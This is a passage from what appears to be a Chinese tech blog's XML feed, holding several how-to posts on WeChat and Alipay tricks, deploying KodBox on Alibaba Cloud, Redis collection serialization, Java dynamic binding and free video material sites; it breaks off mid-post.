        <content type="html"><![CDATA[<p>近日，小编突然发现小伙伴的微信图标不再是万年不变的图标了，而是萌萌的图标！<br>在小编的追问下，小伙伴就把方法教给小编了，还别说，真的好萌好可爱！<br>首先我们打开iPhone上的<strong>【快捷指令APP】</strong> 然后点击右上角<strong>【+】</strong>进去<br>新建一个快捷指令，点击<strong>【添加操作】</strong> 然后搜索<strong>【打开APP】</strong></p><p><img src="https://static.luozhinet.com/56/f21821f27905de11f73bd83b274ec6" alt="微信可自定义图标啦！超萌超可爱！" title="微信可自定义图标啦！超萌超可爱！"></p><p>然后点击【选择】进去 选择【微信】 然后点击进去设置</p><p><img src="https://static.luozhinet.com/5e/460954cfe64107e01459e525ab86da" alt="微信可自定义图标啦！超萌超可爱！" title="微信可自定义图标啦！超萌超可爱！"></p><p>点击【添加到主屏幕】，进去设置快捷指令的图标和名称，点击完成即可！</p><p><img src="https://static.luozhinet.com/ee/8b5b8b5f15c7212a1d81ce3a6f3137" alt="微信可自定义图标啦！超萌超可爱！" title="微信可自定义图标啦！超萌超可爱！"></p><p>完成之后即可在桌面查看可爱的微信图标啦！<br>不过小编默默的看着这图标，就很别扭，微信图标都找到对象了，而小编还是个单身狗，呜呜呜！</p><p><img src="https://static.luozhinet.com/51/682e89835e1638aec0f974cd2b5743" alt="微信可自定义图标啦！超萌超可爱！" title="微信可自定义图标啦！超萌超可爱！"></p><p><strong>去除快捷指令通知</strong><br>当我们设置了自定义图标后，打开软件时手机会出现快捷指令的横幅通知，这个通知也是可以去掉的哦！<br>首先打开快捷指令App，点击<strong>【自动化-创建个人自动化】</strong>进去<br>选择<strong>【App】</strong>选取已经自定义图标的微信，然后选择<strong>【已打开】</strong>，点击下一步。</p><p><img src="https://static.luozhinet.com/b8/63cab9865440efa3f0659aee258439" alt="微信可自定义图标啦！超萌超可爱！" title="微信可自定义图标啦！超萌超可爱！"></p><p>然后点击<strong>【添加操作】</strong>，搜索找到<strong>【无】</strong>这个操作添加，点击下一步<br>将【运行前询问】和【运行前通知】开关<strong>都关闭</strong>，最后点击右上角的【完成】即可<br>操作完成后，我们再打开自定义图标的软件时就不会跳转也不会出现横幅提醒啦！</p><p><img src="https://139.198.176.82:86/data/images/2022-05-11/7c021733d7ec04a9053585bb49afe675.jpg" alt="微信可自定义图标啦！超萌超可爱！" title="微信可自定义图标啦！超萌超可爱！"></p><p>小编给大家提供了部分素材哦，有需要的可以保存原图即可使用，也可自行去寻找其他的哦！</p><p><img src="https://static.luozhinet.com/a6/fa3f899fcf5100f0ea41ab339efa5c" alt="微信可自定义图标啦！超萌超可爱！" title="微信可自定义图标啦！超萌超可爱！"><img src="https://static.luozhinet.com/a8/2ed7070b0db6192394b38118f14617" alt="微信可自定义图标啦！超萌超可爱！" title="微信可自定义图标啦！超萌超可爱！"><img src="https://static.luozhinet.com/40/4eefbdb58187e80f6f37111c7aeced" alt="微信可自定义图标啦！超萌超可爱！" title="微信可自定义图标啦！超萌超可爱！"></p><p><img src="https://static.luozhinet.com/14/740ddadabf47270a2e7f3240333317" alt="微信可自定义图标啦！超萌超可爱！" title="微信可自定义图标啦！超萌超可爱！"><img src="https://static.luozhinet.com/68/787cc67e8f61a039f3677567ef475f" alt="微信可自定义图标啦！超萌超可爱！" title="微信可自定义图标啦！超萌超可爱！"><img src="https://static.luozhinet.com/53/408622cff175befc8d5a50b8f1bb83" alt="微信可自定义图标啦！超萌超可爱！" title="微信可自定义图标啦！超萌超可爱！"></p><p><img src="https://static.luozhinet.com/92/9259a3e43cea8e15bb07a1cd26180d" alt="微信可自定义图标啦！超萌超可爱！" title="微信可自定义图标啦！超萌超可爱！"></p>]]></content>
      
      
      <categories>
          
          <category> 技巧分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作 </tag>
            
            <tag> 方法 </tag>
            
            <tag> 对象 </tag>
            
            <tag> 指令 </tag>
            
            <tag> 素材 </tag>
            
            <tag> 微信 </tag>
            
            <tag> 点击 </tag>
            
            <tag> 图标 </tag>
            
            <tag> 快捷 </tag>
            
            <tag> 进去 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1分钟 Serverless极速搭建高性能网盘</title>
      <link href="/posts/2bb24d491704/"/>
      <url>/posts/2bb24d491704/</url>
      
        <content type="html"><![CDATA[<p>当前，网盘几乎已成为现代人的标配，而市面上的网盘功能、费用各异，让用户们陷入了对比价格和功能的迷阵中。别对比了，动手吧！作为对存储、流量、资源……最了解的“内行人”，自己搭建一个高性能网盘，才是开发者最极客、最具性价比的选择！</p><p>这一次我们基于 Serverless 应用中心 +阿里云函数计算+ 开源企业级在线文件管理系统 KodBox 打造场景，让你仅用”几次“点击，进入 Serverless 的世界，<strong>拥有一个可随意保存资源、不限速下载、多端使用、与朋友共享资源……的个人网盘。</strong></p><h2 id="体验有礼"><a href="#体验有礼" class="headerlink" title="体验有礼"></a>体验有礼</h2><p>5.9-5.20 ，自建真网盘，1 步可抢百变指尖陀螺</p><p>前往领取：<a href="https://developer.aliyun.com/adc/series/activity/serverlessapp">https://developer.aliyun.com/adc/series/activity/serverlessapp</a></p><h2 id="体验简介"><a href="#体验简介" class="headerlink" title="体验简介"></a>体验简介</h2><p>网盘已经逐渐成为现代人的标配，当前市面上的网盘众多，他们的主打功能类似，但是在付费、限速、附加功能等方面确有很大区别，也让广大用户陷入衡量性价比和功能的迷阵。</p><p>随着云计算的高速发展，Serverless 架构逐渐以低成本，高效能被开发者认可。那么是否可以基于 Serverless 架构快速搭建一个自己的网盘呢？这个网盘可以随意存资源、不限速下载、多端使用、与朋友共享资源…… ，答案是：当然可以！</p><p>本场景将使用阿里云函数计算，以及开源项目 Kodbox，带大家 1分钟 Serverless 极速搭建个人高性能网盘，网盘可长期使用。</p><p>什么是函数计算：函数计算是事件驱动的全托管计算服务。使用函数计算，您无需采购与管理服务器等基础设施，只需编写并上传代码。函数计算为您准备好计算资源，弹性地可靠地运行任务，并提供日志查询、性能监控和报警等功能。函数计算帮助您无需管理服务器（Serverless），仅专注于函数代码就能快速搭建应用。函数计算能够弹性地伸缩，您只需要按使用量付费。</p><p>什么是Kodbox：Kodbox是可道云推出的企业级私有云存储解决方案，旨在为中小企业提供安全可控、可靠易用的一站式在线文件存储管理与协同办公平台。</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>在体验本场景之前，需要开通以下服务：</p><p>函数计算 FC：<a href="https://fcnext.console.aliyun.com/">https://fcnext.console.aliyun.com/</a></p><p>硬盘挂在 NAS：<a href="https://nasnext.console.aliyun.com/">https://nasnext.console.aliyun.com/</a></p><p>另外：本场景可能会产生费用，主要包括：</p><p>\1. 硬盘挂载存储费用：<a href="https://help.aliyun.com/document_detail/54301.html">https://help.aliyun.com/document_detail&#x2F;54301.html</a></p><p>\2. 函数计算资源使用费用：<a href="https://www.aliyun.com/price/product">https://www.aliyun.com/price/product</a></p><p>如需长期使用本网盘，请仔细阅读硬盘挂在存储费用（NAS）和函数计算（FC）资源使用费用，避免产生意料之外的费用；如仅为体验功能不做长期使用，请按照文档最后删除步骤，部署之后立即删除。</p><h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><h4 id="开通业务"><a href="#开通业务" class="headerlink" title="开通业务"></a><strong>开通业务</strong></h4><p>开通以下服务：</p><p>函数计算 FC：<a href="https://fcnext.console.aliyun.com/">https://fcnext.console.aliyun.com/</a></p><p>硬盘挂在 NAS：<a href="https://nasnext.console.aliyun.com/">https://nasnext.console.aliyun.com/</a></p><h4 id="创建网盘"><a href="#创建网盘" class="headerlink" title="创建网盘"></a><strong>创建网盘</strong></h4><p>进入到函数计算控制台：<a href="https://fcnext.console.aliyun.com/overview">https://fcnext.console.aliyun.com/overview</a></p><p>点击左侧的应用按钮：</p><p><img src="http://static.luozhinet.com/4e/50dfa537cae4d5e471bf5a391dcaba" alt="img"></p><p>注：如果之前使用过应用中心，点击应用之后出现类似于下面的页面：</p><p><img src="http://static.luozhinet.com/38/148a056a26a6e979f74511b24c5e49" alt="img"></p><p>此时可以点击“创建应用”按钮继续流程。</p><p>点击应用&#x2F;创建应用之后，可以看到应用列表：</p><p><img src="http://static.luozhinet.com/7c/e33b39d1c107f98f3e0d5e5ebcb57b" alt="img"></p><p>此时选择“KodBox”即可：</p><p><img src="http://static.luozhinet.com/e1/ef4ab30316af45cd61d702d33dc05d" alt="img"></p><p>选择立即创建，然后选择直接部署：</p><p><img src="http://static.luozhinet.com/8d/fce51f32e00767d32acf3ab1b05302" alt="img"></p><p>此时还需要关注页面上角色名称部分，例如：</p><p><img src="http://static.luozhinet.com/ab/46d33847c415626a94471f19d56621" alt="img"></p><p>此时需要点击前往授权进行授权，授权完成可能会提示：</p><p><img src="http://139.198.176.82:86/data/images/2022-05-11/c4f7a1e1136a0b7e2d3e5c31be7035c2.png" alt="img"></p><p>完成之后点击页面最下面的创建按钮：</p><p><img src="http://static.luozhinet.com/f9/8c6ec341c802edd945d88ce6d8fe86" alt="img"></p><p>此处要稍等片刻，等待创建完成，可以看到访问域名：</p><p><img src="http://static.luozhinet.com/85/e6291bbfd9a840b0cf38bd21696993" alt="img"></p><p>此时可以打开访问域名进行登录测试：</p><p><img src="http://139.198.176.82:86/data/images/2022-05-11/26bf7a038f64e395db23aa0b4ea94266.png" alt="img"></p><p>测试账号：admin</p><p>测试密码：admin</p><p>后期自己可以修改账号密码。</p><p>此时自己的云网盘、云桌面就完成了：</p><p><img src="http://static.luozhinet.com/a4/0d2b80d5eeb0e4b16038671197d30c" alt="img"></p><h2 id="资源删除"><a href="#资源删除" class="headerlink" title="资源删除"></a><strong>资源删除</strong></h2><p>本操作中中的部署过程是免费的，但是在后期的使用过程是会产生一定的费用，主要包括：</p><p>\1. NAS的存储费用，具体的费用参考：<a href="https://www.aliyun.com/price/product?spm=5176.59209.J_5834642020.11.1ce176b9ut6vjT#/nas/detail/nas_bag">https://www.aliyun.com/price/product?spm=5176.59209.J_5834642020.11.1ce176b9ut6vjT#&#x2F;nas&#x2F;detail&#x2F;nas_bag</a></p><p>\2. 函数计算的资源使用费用，具体的费用参考：<a href="https://help.aliyun.com/document_detail/54301.html?spm=5176.137990.J_5253785160.6.6bbc1608aysgbJ">https://help.aliyun.com/document_detail&#x2F;54301.html?spm&#x3D;5176.137990.J_5253785160.6.6bbc1608aysgbJ</a></p><p>所以您之后如果需要上传、下载等操作，可能都会涉及到相关得用，如果您为了避免费用的产生，您可以删除相对应的资源：</p><p>\1. 删除帮您创建的硬盘挂载服务，NAS控制台: <a href="https://nasnext.console.aliyun.com/">https://nasnext.console.aliyun.com/</a></p><p>\2. 删除帮助您创建的函数计算服务，函数计算控制台：<a href="https://fcnext.console.aliyun.com/">https://fcnext.console.aliyun.com/</a></p><p>另外，您也可以点击应用中心右上角的删除服务，通过弹出的窗口，点击右边 <strong>ID&#x2F;NAME</strong> 的超链接，进行对应资源的删除。</p><p><img src="http://static.luozhinet.com/a3/105086380f006129ccdb04f7ee378b" alt="img"></p><p>需要注意的是，如果您通过其他途径&#x2F;渠道对要删除的硬盘挂载或者函数计算资源进行了使用，请注意删除后的影响。</p>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作 </tag>
            
            <tag> 密码 </tag>
            
            <tag> 授权 </tag>
            
            <tag> 应用 </tag>
            
            <tag> 服务 </tag>
            
            <tag> 架构 </tag>
            
            <tag> 中心 </tag>
            
            <tag> 服务器 </tag>
            
            <tag> 免费 </tag>
            
            <tag> 删除 </tag>
            
            <tag> 账号 </tag>
            
            <tag> 函数 </tag>
            
            <tag> 网盘 </tag>
            
            <tag> 计算 </tag>
            
            <tag> serverless </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>太酷了！支付宝能自定义收账号了</title>
      <link href="/posts/caffc4bd2544/"/>
      <url>/posts/caffc4bd2544/</url>
      
        <content type="html"><![CDATA[<p>太酷了！支付宝能自定义收账号了</p><p>你敢信，支付宝现在也能自定义收账号了。<br>先给兄弟萌看看我现在的支付宝账号，有没有被帅到？</p><p><img src="http://static.luozhinet.com/db/ced2d5a73415dab85495d7ce38a154" alt="太酷了！支付宝能自定义收账号了" title="太酷了！支付宝能自定义收账号了"></p><p>这可不是PS或者仅自己可见哟，别人转账时也可以直接输入这个账号进行操作，不信的粉丝可以通过这个账号给我转账试试<br>小编看到他朋友圈后询问的方法，果然我们粉丝都是无私的，直接把方法甩给我了</p><p><img src="http://static.luozhinet.com/72/cbf001afd05bc49afe924d9d34d962" alt="太酷了！支付宝能自定义收账号了" title="太酷了！支付宝能自定义收账号了"></p><p>聪明的小伙子们只需要看上图就可以自己去操作了<br>看不懂的朋友跟着小编步骤来吧<br>自定义支付宝账号首先需要准备两个手机号（必须绑定过支付宝的）<br><strong>第一步</strong><br><strong>首先查看这两个支付宝是否绑定过邮箱</strong><br>打开支付宝APP→我的→设置→账号与安全<br>如果账号绑定了邮箱，需要点进去先进行停用</p><p><img src="http://static.luozhinet.com/b9/bc752666a597356cad4feb97cfe7cb" alt="太酷了！支付宝能自定义收账号了" title="太酷了！支付宝能自定义收账号了"></p><p>点击邮箱后进入停用页面，选择“停用邮箱”即可<br><strong>注意：我们准备的两个支付宝账号都需要先停用邮箱</strong>（设置好自定义账号后可以在支付宝官网上重新绑定）</p><p><img src="http://static.luozhinet.com/0e/36be44975ad7635eb539783dde0751" alt="太酷了！支付宝能自定义收账号了" title="太酷了！支付宝能自定义收账号了"></p><p>第二步<br>两个账号邮箱都停用之后，就可以进行自定义账号的操作了<br>首先我们打开支付宝APP→我的→设置→账号与安全 <br>点击手机号这一栏，选择修改手机号，<strong>然后填写我们另一个支付宝绑定的手机号</strong></p><p><img src="http://static.luozhinet.com/c8/8982a1700cda3d80ff93118b7af98a" alt="太酷了！支付宝能自定义收账号了" title="太酷了！支付宝能自定义收账号了"></p><p>因为另一个手机号已经被占用，所以是无法修改成功的<br>到这一步就算完成了，这时候大家就可以自定义自己的支付宝账号啦，<strong>可任意组合6-20位的账号</strong></p><p><img src="http://static.luozhinet.com/de/0da2ac840021c7366ffa9431c659f4" alt="太酷了！支付宝能自定义收账号了" title="太酷了！支付宝能自定义收账号了"></p><p>账号会显示在自己的个人信息里，并且通过账号是可以直接转账或者添加好友的哟<br>简直不要太酷了！</p><p><img src="http://static.luozhinet.com/76/e85ffa5664f8bfc066d057a7a790ad" alt="太酷了！支付宝能自定义收账号了" title="太酷了！支付宝能自定义收账号了"></p>]]></content>
      
      
      <categories>
          
          <category> 技巧分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作 </tag>
            
            <tag> 账号 </tag>
            
            <tag> 方法 </tag>
            
            <tag> 邮箱 </tag>
            
            <tag> 绑定 </tag>
            
            <tag> 支付宝 </tag>
            
            <tag> 停用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于Redis的问题探讨：为何存放集合偏向于转String后存放而非直接存</title>
      <link href="/posts/3bb1a894e730/"/>
      <url>/posts/3bb1a894e730/</url>
      
        <content type="html"><![CDATA[<p>在查看公司封装的RedisService中，发现在存放集合时，集合都是先转为String，再进行存放，而非直接存放对象本身。</p><p>对此产生疑问，因为转String存放后再取出，又要转一次才可以恢复集合，而就算使用fastJson也会消耗性能，那为何要这么做呢？ 所以现在就直接上手一下，找出原因。</p><p>IRedisService</p><p>import java.util.Collection;<br>import java.util.List;<br>​<br>public interface IRedisService {<br>​<br>    List lRange(final String key, long start, long end);<br>​<br>    Long rightPushAll(final String key, Collection value);<br>​<br>}</p><p>RedisServiceImpl</p><p>import com.zyuan.boot.redis.IRedisService;<br>import org.slf4j.Logger;<br>import org.slf4j.LoggerFactory;<br>import org.springframework.beans.factory.annotation.Autowired;<br>import org.springframework.data.redis.core.RedisTemplate;<br>import org.springframework.stereotype.Service;<br>​<br>import java.util.Collection;<br>import java.util.List;<br>​<br>@Service<br>public class RedisServiceImpl implements IRedisService {<br>​<br>    private static final Logger log &#x3D; LoggerFactory.getLogger(RedisServiceImpl.class);<br>​<br>    @Autowired<br>    private RedisTemplate redisTemplate;<br>​<br>    @Override<br>    public List lRange(String key, long start, long end) {<br>        List result = null;<br>        try {<br>            result = redisTemplate.opsForList().range(key, start, end);<br>        } catch (Exception e) {<br>            log.error(“redis range失败：” + e.getMessage());<br>        }<br>        return result;<br>    }<br>​<br>    @Override<br>    public Long rightPushAll(String key, Collection value) {<br>        Long result = null;<br>        try {<br>            result = redisTemplate.opsForList().rightPushAll(key, value);<br>        } catch (Exception e) {<br>            log.error(“redis push all失败：” + e.getMessage());<br>        }<br>        return result;<br>    }<br>​<br>}</p><p>ThisIsDTO：用于存入Redis中</p><p>@Data<br>public class ThisIsDTO implements Serializable {<br>​<br>    private String name;<br>​<br>    private Integer age;<br>​<br>    private Long time;<br>​<br>    private Long iiid;<br>​<br>}</p><p>测试类</p><p>import com.zyuan.boot.redis.dto.ThisIsDTO;<br>import org.junit.Test;<br>import org.junit.runner.RunWith;<br>import org.springframework.beans.factory.annotation.Autowired;<br>import org.springframework.boot.test.context.SpringBootTest;<br>import org.springframework.test.context.junit4.SpringRunner;<br>​<br>import java.util.ArrayList;<br>import java.util.LinkedHashMap;<br>import java.util.List;<br>​<br>@SpringBootTest<br>@RunWith(SpringRunner.class)<br>public class RedisServiceTest {<br>​<br>    @Autowired<br>    private IRedisService redisService;<br>​<br>    @Test<br>    public void testRightPushAll() {<br>        String key = “right_push_all_01”;<br>        List<ThisIsDTO> addDTOList &#x3D; getAddDTOList();<br>        Long result = redisService.rightPushAll(key, addDTOList);<br>        System.out.println(result);<br>    }<br>​<br>    private List<ThisIsDTO> getAddDTOList() {<br>        List<ThisIsDTO> addDTOList &#x3D; new ArrayList&lt;&gt;();<br>        for (int i &#x3D; 4; i &lt;&#x3D; 7; i++) {<br>            ThisIsDTO dto = new ThisIsDTO();<br>            String name = “name” + i + i;<br>            Integer age = i*30;<br>            Long time = i*20L;<br>            dto.setName(name);<br>            dto.setAge(age);<br>            dto.setTime(time);<br>            addDTOList.add(dto);<br>        }<br>        return addDTOList;<br>    }<br>​<br>}</p><p>执行testRightPushAll，通过Redis可视化工具查看是否添加成功：</p><p><img src="http://static.luozhinet.com/7a/a09fed1e968fa98ced81c90755c0d3"></p><p>先通过对象的方式来存储查出的数据</p><pre><code>@Testpublic void testLRange() &#123;    String key \= &quot;right\_push\_all\_01&quot;;    List&lt;ThisIsDTO&gt; dtoList = redisService.lRange(key, 0, -1);    System.out.println(dtoList.toString());    for (ThisIsDTO thisIsDTO : dtoList) &#123;        String name \= thisIsDTO.getName();    &#125;&#125;</code></pre><p>在for处打个断点，debug运行</p><p><img src="http://static.luozhinet.com/2e/20b7890650dd9c647f623db310f7d8"></p><p>数据确实查询成功</p><p>但是继续运行，发现报错了</p><p><img src="http://static.luozhinet.com/e7/7f59c1e27d5abae306e1056c7be042"></p><p>看报错信息，LinkedHashMap不能转换为ThisIsDTO类型，</p><p>所以，获取到的集合，其实是 List&lt;LinkedHashMap&lt;String, Object&gt;&gt;，</p><p>通过LinkedHashMap来存放数据：</p><p>@Test<br>    public void testLRange() {<br>        String key = “right_push_all_01”;<br>        List&lt;LinkedHashMap&lt;String, Object&gt;&gt; linkedHashMapList &#x3D; redisService.lRange(key, 0, -1);<br>        for (LinkedHashMap&lt;String, Object&gt; linkedHashMap : linkedHashMapList) {<br>            for (String concurrentKey : linkedHashMap.keySet()) {<br>                Object value = linkedHashMap.get(concurrentKey);<br>                System.out.println(concurrentKey + “—&gt;” + value);<br>            }<br>            System.out.println(“&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;”);<br>        }<br>    }</p><p>再次运行，查看控制台打印信息：</p><p><img src="http://static.luozhinet.com/6a/78051f63c09caf24cbc4c30f1c7bc6"></p><p>东西都正常查出来了。</p><p>同样的，通过Redis可视化工具手动创建集合，查询出来的结果也是如此，可以自行验证一下。</p><p>所以这种方式获取到的集合，将其转换为原来对象类型比较困难，因此选择直接将集合转为String类型，然后取出来之后直接通过fastJson直接转回去更加便捷。</p>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 对象 </tag>
            
            <tag> int </tag>
            
            <tag> new </tag>
            
            <tag> public </tag>
            
            <tag> import </tag>
            
            <tag> string </tag>
            
            <tag> util </tag>
            
            <tag> long </tag>
            
            <tag> result </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态绑定机制</title>
      <link href="/posts/5fd7efa9bb02/"/>
      <url>/posts/5fd7efa9bb02/</url>
      
        <content type="html"><![CDATA[<h1 id="动态绑定机制"><a href="#动态绑定机制" class="headerlink" title="动态绑定机制"></a>动态绑定机制</h1><p>java的动态绑定机制：</p><blockquote><ol><li>当调用对象方法的时候，<strong>该方法会和该对象的内存地址&#x2F;运行类型绑定</strong>；</li><li>当调用对象属性时，<strong>没有动态绑定机制</strong>，在哪个类中声明就用哪个类中的属性；</li></ol></blockquote><p>代码示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.hspedu.poly_.dynamic_;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> gaoqinghui</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2022/4/15 15:31</span></span><br><span class="line"><span class="comment"> * java的动态绑定机制</span></span><br><span class="line"><span class="comment"> * 1.当调用对象方法时，该方法会和该对象的内存地址/运行类型绑定</span></span><br><span class="line"><span class="comment"> * 2.当调用对象属性时，没有动态绑定机制，哪里声明，哪里使用</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DynamicBinding</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//A是a的编译类型，B是a的运行类型</span></span><br><span class="line">        <span class="type">A</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">B</span>();</span><br><span class="line">        <span class="comment">//解释：当调用a.sum()时，我们的运行内存是B，首先会去子类中寻找看是否有sum方法，这时我们把子类中的sum方法注释了，根据继承关系，会继续向上寻找父类看是否有sum这个方法，这时父类A中有sum这个方法，调用这个方法后，返回的时geti() + 10，根据动态绑定机制，这时会根据我们a的运行内存去寻找这个geti()方法，a的运行类型时B，就去B中找是否有geti()，这时找到，返回i，因为返回i是属性，属性没有动态绑定机制，返回的就是就是B类中定义的i，也就是20，然后返回父类，结果为30；</span></span><br><span class="line">        System.out.println(a.sum());</span><br><span class="line">        System.out.println(a.sum1());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">sum</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> geti() + <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">sum1</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> i + <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">geti</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> <span class="keyword">extends</span> <span class="title class_">A</span> &#123;  <span class="comment">//子类</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">20</span>;</span><br><span class="line"><span class="comment">//    public int sum()&#123;</span></span><br><span class="line"><span class="comment">//        return i + 20;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">geti</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//    public int sum1()&#123;</span></span><br><span class="line"><span class="comment">//        return i + 10;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 方法 </tag>
            
            <tag> 对象 </tag>
            
            <tag> int </tag>
            
            <tag> new </tag>
            
            <tag> sum </tag>
            
            <tag> public </tag>
            
            <tag> geti </tag>
            
            <tag> 绑定 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>批量删除微信好友技巧经验分享</title>
      <link href="/posts/41c16cb60b68/"/>
      <url>/posts/41c16cb60b68/</url>
      
        <content type="html"><![CDATA[<p><img src="http://static.luozhinet.com/21/2517af7e2a5843d564b27e6b916c1b" alt="批量删除微信好友技巧经验分享" title="批量删除微信好友技巧经验分享"></p><p><img src="http://static.luozhinet.com/28/f9bba74a306ca73109e5615ed2aacb" alt="批量删除微信好友技巧经验分享" title="批量删除微信好友技巧经验分享"></p><p><strong>文字教程：</strong><br>1.新建一个标签，将需要删除的好友加入标签。<br>2.在通讯录首页上方的搜索框刚才新建的标签，点击下方的更多联系人。<br>3.点击右上角的管理，而后进行勾选，勾选完成点击下方的删除，即可删除完成。 批量删除微信好友技巧经验分享</p>]]></content>
      
      
      <categories>
          
          <category> 技巧分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 删除 </tag>
            
            <tag> 搜索 </tag>
            
            <tag> 技巧 </tag>
            
            <tag> 标签 </tag>
            
            <tag> 微信 </tag>
            
            <tag> 点击 </tag>
            
            <tag> 勾选 </tag>
            
            <tag> 新建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最新永久冻结QQ解决方法分享</title>
      <link href="/posts/fc874c18bed5/"/>
      <url>/posts/fc874c18bed5/</url>
      
        <content type="html"><![CDATA[<p>最新永久冻结QQ解决方法分享<img src="https://www.52zyw.com/upFiles/infoImg/202204141323204675.jpg" alt="最新永久冻结QQ解决方法分享" title="最新永久冻结QQ解决方法分享"></p><p>1.到最新版QQ登录永久冻结的QQ，点击了解详情。然后出现如图所示<br>2.按照提示进行需要手持身份证和一份手写承诺书和身份证在一起的照片承诺书<br>3.提交好了以后等待客服审核就行了，基本都能通过。。<br>这是tx推出最新的封永久QQ解冻的方法。</p>]]></content>
      
      
      <categories>
          
          <category> 技巧分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 方法 </tag>
            
            <tag> qq </tag>
            
            <tag> 冻结 </tag>
            
            <tag> 永久 </tag>
            
            <tag> 承诺书 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>视频剪辑必看，6个免费的音、视频素材网站</title>
      <link href="/posts/f341ac31567e/"/>
      <url>/posts/f341ac31567e/</url>
      
        <content type="html"><![CDATA[<p>​</p><p>当下短视频时代，越来越多人选择做自媒体，美食、宠物、日常分享、搞笑等各种类型的都有。</p><p>在视频创作的时候往往需要很多的素材，比如说表情包、视频专场、音频、背景音乐等等。</p><p>那这些素材一般都要去哪里找呢？其实很多网站都有提供相关的素材，但就是不免费，即使免费还要担心会不会侵权。</p><p>下面我就要推荐6个视频及音频素材网站，都是免费，还可以商用哦，赶紧收藏起来吧！</p><p><strong>1、菜鸟图库</strong></p><p><a href="https://www.sucai999.com/video.html?v=NTYwNDUx" title="https://www.sucai999.com/video.html?v=NTYwNDUx">https://www.sucai999.com/video.html?v=NTYwNDUx</a></p><p>网站内有超多高清、无水印视频素材，自然、人物、交通、美食等各种类型都很齐全，重点是全部能免费下载，还可商用哦。</p><p><img src="http://static.luozhinet.com/b4/78bc5537061d796d9380b84e1e5138">​</p><p><img src="http://static.luozhinet.com/91/3c28c130673fd867a98b488baed2bb" title="点击并拖拽以移动"></p><p><a href="https://www.sucai999.com/audio.html?v=NTYwNDUx" title="https://www.sucai999.com/audio.html?v=NTYwNDUx">https://www.sucai999.com/audio.html?v=NTYwNDUx</a></p><p>音频素材也非常多，像游戏类、影视类、动画类等等在这里面都能找到，分类很清晰，全部都能免费下载。</p><p><img 